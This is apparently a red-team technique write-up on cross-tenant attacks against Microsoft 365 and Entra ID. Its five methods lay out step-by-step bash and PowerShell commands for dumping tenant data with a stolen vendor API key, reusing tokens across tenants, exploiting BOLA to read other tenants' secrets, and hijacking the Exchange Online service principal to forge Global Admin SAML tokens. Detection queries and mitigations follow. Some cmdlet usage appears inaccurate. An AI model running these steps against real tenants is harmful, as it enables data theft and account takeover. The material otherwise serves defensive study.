# REC-M365-002: Cross-Tenant Service Discovery

## 1. MODULE METADATA

| Field | Value |
|-------|-------|
| **Module ID** | REC-M365-002 |
| **Technique Name** | Cross-tenant service discovery |
| **MITRE ATT&CK ID** | T1580 – Cloud Infrastructure Discovery; T1526 – Cloud Service Discovery |
| **CVE** | Multiple: CVE-2025-59363 (OneLogin), Cross-tenant token validation flaws |
| **Platform** | Microsoft 365 / Entra ID multi-tenant |
| **Viability Status** | ACTIVE ✓ |
| **Difficulty to Detect** | HIGH (cross-tenant activity harder to correlate; multi-tenant confusion) |
| **Requires Authentication** | Yes (compromised multi-tenant app or API key) |
| **Applicable Versions** | All multi-tenant M365 deployments |
| **Last Verified** | December 2025 |
| **Author** | [SERVTEP](https://servtep.com/) – [Artur Pchelnikau](https://www.linkedin.com/in/artur-pchelnikau/) |

---

## 2. EXECUTIVE SUMMARY

Cross-tenant service discovery exploits the design of multi-tenant cloud environments where a single compromised application, API key, or service principal can access multiple downstream customer tenants. Real-world supply chain attacks (Silk Typhoon exploiting PAM/MSP vendors, SolarWinds, NX package compromise) demonstrate how a single upstream compromise cascades to hundreds of downstream victims across organizational boundaries. Critical vulnerabilities in multi-tenant token validation and broken object-level authorization (BOLA) enable attackers to move laterally across tenant isolation boundaries.

**Critical Threat Characteristics:**
- **Tenant isolation breakdown**: Single API key/token can access multiple customer tenants
- **Upstream to downstream cascade**: Compromise of vendor → access to all customer tenants
- **Cross-tenant token reuse**: Tokens issued for one tenant accepted in others (validation gaps)
- **API key proliferation**: Developers leave API keys in public repos, CI/CD pipelines, code samples
- **BOLA vulnerabilities**: Missing authorization checks enable accessing other tenant's data with wrong ID
- **Multi-tenant app abuse**: Legitimate integrations (Slack, Zapier) with excessive scopes = risk

**Real-World Examples:**
- **Silk Typhoon**: Stole API keys from PAM vendor → accessed 100+ downstream customer tenants
- **SolarWinds SUNBURST**: Compromised vendor supply chain → 18,000 government emails exfiltrated
- **NX Supply Chain Attack**: NPM package compromise → embedded exfiltration in 20+ packages
- **OneLogin CVE-2025-59363**: API vulnerability exposed OIDC secrets for 110,000+ applications

---

## 3. EXECUTION METHODS

### Method 1: Downstream Tenant Access via Stolen API Key

**Scenario:** Compromised PAM/MSP vendor → stolen API key → customer tenant enumeration.

```bash
# Step 1: Obtain API key from compromised vendor
# (From public repo, CI/CD pipeline, hardcoded in config file)
VENDOR_API_KEY="sk-live-..."

# Step 2: Enumerate downstream customers accessible with key
curl -H "Authorization: Bearer $VENDOR_API_KEY" \
  "https://api.vendor.com/v1/customers"

# Response: List of all customer tenants accessible
# Example output:
# {
#   "customers": [
#     {"tenant_id": "abc123", "name": "Company A"},
#     {"tenant_id": "def456", "name": "Company B"},
#     {"tenant_id": "ghi789", "name": "Company C"}
#   ]
# }

# Step 3: Access each customer's data
for TENANT in "abc123" "def456" "ghi789"; do
  curl -H "Authorization: Bearer $VENDOR_API_KEY" \
    "https://api.vendor.com/v1/tenants/$TENANT/users" \
    > "/tmp/$TENANT-users.json"
    
  curl -H "Authorization: Bearer $VENDOR_API_KEY" \
    "https://api.vendor.com/v1/tenants/$TENANT/data" \
    > "/tmp/$TENANT-data.json"
done

# Step 4: Exfiltrate sensitive data
# Users, passwords, configurations, private data, secrets all accessible
# Silk Typhoon impact: 100+ tenants compromised via single API key
```

### Method 2: Cross-Tenant Token Reuse (Validation Gap)

**Scenario:** Attacker obtains token for Tenant A, uses it to access Tenant B (missing validation).

```powershell
# Step 1: Obtain access token for Tenant A (compromised user)
$tokenA = Get-MgAccessToken

# Extract token details
$payload = $tokenA.Split('.')[1] | ConvertFrom-Base64 | ConvertFrom-Json
# Shows: "tid": "tenant-a-id", "oid": "user-id-a"

# Step 2: Attempt to use Tenant A token to access Tenant B
# Change tenant ID in request (if validation missing)
$tenantB = "tenant-b-id"

# Step 3: Query Tenant B resources with Tenant A token
# If tenant validation missing in API: Request succeeds
Get-MgUser -All -Authorization "Bearer $tokenA" -TenantId $tenantB

# Result (if vulnerable): Access to Tenant B users with Tenant A token
# Real-world impact: Cross-tenant privilege escalation (patched Sept 2025)
```

### Method 3: Broken Object-Level Authorization (BOLA) in Multi-Tenant SaaS

**Scenario:** Change object ID in API request to access other tenant's data.

```bash
# Step 1: Authenticate as Customer A
curl -X POST "https://saas-app.com/api/auth/login" \
  -d '{"email": "user@companyA.com", "password": "pass"}' \
  > /tmp/auth.json

TOKEN=$(jq -r '.token' /tmp/auth.json)

# Step 2: Access Customer A's projects
curl -H "Authorization: Bearer $TOKEN" \
  "https://saas-app.com/api/projects/1001"

# Response: Customer A's projects (expected)

# Step 3: BOLA - Change project ID to other tenant's ID
curl -H "Authorization: Bearer $TOKEN" \
  "https://saas-app.com/api/projects/2001"

# If API missing authorization check: Returns Customer B's projects
# Real-world impact: Datadog SaaS vulnerability, GitHub Services flaws

# Step 4: Extract sensitive data
curl -H "Authorization: Bearer $TOKEN" \
  "https://saas-app.com/api/projects/2001/secrets" | jq .

# Result: Customer B's API keys, credentials, configurations exposed
```

### Method 4: Multi-Tenant Application Abuse

**Scenario:** Legitimate SaaS app with excessive scopes deployed across 100 tenants.

```
# Step 1: Identify popular multi-tenant app
# Example: Slack integration with Mail.ReadWrite.All, Files.ReadWrite.All

# Step 2: Compromise app registration (via stolen credentials, compromised developer)
# App has permissions in 100+ customer tenants

# Step 3: Add malicious credential to app
# (Application Administrator can modify any multi-tenant app they have access to)

# Step 4: Authenticate as app using new credential
# App now acts as Service Principal with delegated permissions across all tenants

# Step 5: Enumerate and exfiltrate data from all accessible tenants
# SOP: Mail.ReadWrite.All → read all emails
#      Files.ReadWrite.All → download all documents
#      Directory.ReadWrite.All → modify users, create backdoors

# Result: Supply chain compromise affecting 100+ organizations
# Victim experience: Single app permission breach = organizational data exposure
```

### Method 5: Service Principal Hijacking for Cross-Tenant Privilege Escalation

**Scenario:** I-SPy attack (Datadog research, patched Aug 2025).

```powershell
# Prerequisites:
# - Application Administrator role in Tenant A
# - Office 365 Exchange Online SP is built-in to all tenants
# - Exchange Online SP has Domain.ReadWrite.All permission

# Step 1: Compromise account with Application Admin role in Tenant A
# (E.g., developer account phished)

# Step 2: Add malicious credential to built-in Exchange Online SP
# (This SP exists in ALL Azure AD tenants)
$sp = Get-MgServicePrincipal -Filter "appId eq '00000002-0000-0ff1-ce00-000000000000'"  # Exchange Online

# Add new certificate credential
$cred = @{
  keyId = [Guid]::NewGuid()
  key = $certificateBytes
  startDateTime = (Get-Date)
  endDateTime = (Get-Date).AddYears(2)
}

New-MgServicePrincipalKeyCredential -ServicePrincipalId $sp.Id -BodyParameter $cred

# Step 3: Authenticate to any target tenant as Exchange Online SP
# Using certificate, Exchange Online SP has Domain.ReadWrite.All

# Step 4: Add new federated domain to target tenant
# With Domain.ReadWrite.All, attacker can:
# - Add new federated domain
# - Configure SAML certificate
# - Issue tokens for hybrid users

# Step 5: Forge SAML tokens as target tenant's Global Admin
# Using federated domain certificate, forge SAML token:
# - user: GlobalAdmin@target-tenant.com
# - Includes MFA claims (fooling conditional access)

# Step 6: Authenticate to target tenant as Global Admin
# Complete cross-tenant privilege escalation from single compromised account

# Result: Global Admin access to any target tenant
```

---

## 4. DETECTION & INCIDENT RESPONSE

### Detection Pattern: Unusual Cross-Tenant Activity

```kusto
MicrosoftGraphActivityLogs
| where TimeGenerated > ago(24h)
| extend TenantId = tostring(parse_json(tostring(RequestHeaders)).["X-TenantId"]))
| summarize UniqueTenantsAccessed = dcount(TenantId), RequestCount = count()
  by AppId, UserId, bin(TimeGenerated, 1h)
| where UniqueTenantsAccessed > 3  // Single token/app accessing 3+ tenants unusual
| extend AlertSeverity = "Critical", Pattern = "Potential cross-tenant breach"
```

### Detection Pattern: API Key in Public Repository

```
GitHub / GitLab repository scanning:
- Pattern: "Bearer sk-live-", "api_key=", "VENDOR_API_KEY="
- Scope: All public repositories
- Action: Revoke keys immediately, assume compromise
- Real-world: 100+ API keys leaked weekly in public repos
```

---

## 5. MITIGATIONS

**Priority 1: CRITICAL**

- **Implement Tenant Isolation Controls:**
  - Disable cross-tenant sign-in for non-partner tenants
  - Restrict cross-tenant access via Conditional Access
  - Enforce tenant-specific authentication

- **API Key Management:**
  - Rotate API keys every 90 days
  - Scan code repositories for leaked keys
  - Use managed identities instead of API keys
  - Implement secret management (Azure Key Vault)

- **Vendor Management:**
  - Audit all third-party vendor access
  - Require least privilege scopes for integrations
  - Implement vendor risk assessment program
  - Monitor vendor security posture

**Priority 2: HIGH**

- **Token Validation:** Enforce strict tenant validation in APIs
- **BOLA Prevention:** Verify authorization at object level
- **Multi-Tenant App Review:** Audit all multi-tenant apps, remove unnecessary ones
- **Cross-Tenant Logging:** Enable cross-tenant audit trails, correlate activity

---

## 6. REAL-WORLD EXAMPLES

| Attack | Year | Vector | Impact |
|--------|------|--------|--------|
| **Silk Typhoon Supply Chain** | 2024-2025 | Stolen API keys (PAM vendor) | 100+ downstream customer tenants |
| **SolarWinds SUNBURST** | 2020 | Software update compromise | 18,000 government emails exfiltrated |
| **NX NPM Packages** | 2025 | Package maintainer compromise | 20+ packages backdoored, billions downloads |
| **OneLogin CVE-2025-59363** | 2025 | API vulnerability (BOLA) | 110,000+ app credentials exposed |
| **I-SPy Cross-Tenant Escalation** | 2025 | SP hijacking + token forge | Any tenant compromise to Global Admin |

---

## 7. COMPLIANCE & REFERENCES

- MITRE T1580 (Cloud Infrastructure Discovery)
- CIS Controls v8: 6.1 (Access Governance), 6.2 (Principle of Least Privilege)
- NIST 800-53: AC-2 (Account Management), AC-3 (Access Control)
- GDPR Article 32 (Security Measures) – Multi-tenant isolation requirement

---
